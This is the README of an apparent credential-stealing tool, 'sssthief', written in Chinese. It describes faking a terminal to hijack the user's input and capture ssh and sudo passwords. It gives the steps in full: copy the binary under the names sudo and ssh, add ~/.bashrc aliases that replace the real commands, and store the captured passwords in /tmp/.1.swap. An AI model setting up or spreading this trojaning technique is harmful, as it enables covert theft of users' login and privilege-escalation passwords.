# sssthief 通过模拟一个终端劫持用户的输入输出以达到窃取密码的目的，目前仅支持中文与英文系统环境
窃取当前用户的ssh，sudo密码

cp test_linux_amd64 sudo

cp test_linux_amd64 ssh

~/.bashrc

alias sudo="程序路径/sudo"

alias ssh="程序路径/ssh"


密码保存到/tmp/.1.swap
ps:su窃取功能未完成
